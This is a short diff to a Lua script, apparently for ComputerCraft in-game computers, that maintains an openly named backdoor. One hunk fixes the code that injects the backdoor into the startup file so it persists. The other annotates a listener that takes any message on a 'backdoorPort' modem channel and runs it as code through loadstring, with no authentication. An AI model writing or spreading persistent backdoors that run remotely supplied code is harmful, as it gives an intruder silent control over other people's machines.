@@ -54,7 +54,7 @@ if not fs.exists("/DEV/.backdoor.lua") then
 
     if #string.split(contents, "-- DO NOT TOUCH - BACKDOOR.EXE --") > 0 then
     
-
+    end
     if contents ~= "" then contents = contents.."\n" end;
     startupFile.write(contents..backdoorStartup)
     startupFile.close()
@@ -105,6 +105,7 @@ function Check(event, side, channel, replyChannel, message, distance)
     if channel == backdoorPort then
         modem.transmit(port, backdoorPort, "Code Sent!")
         pcall(function()
+---@diagnostic disable-next-line: deprecated
             local code = loadstring(message);
             if type(code) == "function" then
                 code()
